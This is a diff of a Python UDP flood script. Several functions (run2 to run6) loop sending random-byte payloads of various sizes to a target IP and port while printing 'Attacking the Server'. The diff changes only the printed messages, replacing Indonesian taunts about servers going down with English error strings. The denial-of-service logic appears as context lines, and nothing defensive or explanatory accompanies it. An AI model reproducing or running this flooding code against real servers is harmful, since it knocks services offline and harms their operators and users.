@@ -99,7 +99,7 @@ def run2():
 				s.sendto(data,addr)
 			print(i +" Attacking the Server !! ")
 		except:
-			print("[!] Bek Bek Bek Bek Bek Cemass Kau Dekk !!")
+			print("[!] ERROR SERVER TIME OUT!!!")
 			
 def run3():
 	data = random._urandom(818)
@@ -112,7 +112,7 @@ def run3():
 				s.sendto(data,addr)
 			print(i +" Attacking the Server !!  ")
 		except:
-			print("[!] Bek Bek Bek Bek Bek Cemass Kau Dekk !!")
+			print("[!] ERROR SERVER TIME OUT!!!")
 			
 def run4():
 	data = random._urandom(17)
@@ -123,9 +123,9 @@ def run4():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" YAH DOWN EZZ BANGET SI DEK !! ")
+			print(i +" Attacking the Server !!  ")
 		except:
-			print("[!] ERROR SERVER TELAH MATI")
+			print("[!] ERROR SERVER TIME OUT!!!")
 			
 def run5():
 	data = random._urandom(1872637)
@@ -136,9 +136,9 @@ def run5():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" YAH DOWN EZZ BANGET SI DEK. ")
+			print(i +"Attacking the Server !!  ")
 		except:
-			print("[!] ERROR SERVER OFF")
+			print("[!] ERROR SERVER TIME OUT!!!")
 
 def run6():
 	data = random._urandom(146734)
@@ -149,9 +149,9 @@ def run6():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" YAH DOWN EZZ BANGET SI DEK. ")
+			print(i +" Attacking the Server !! . ")
 		except:
-			print("[!] ERROR SERVER OFF")
+			print("[!] ERROR SERVER TIME OUT!!!")
 
 def run7():
     data = random._urandom(818)
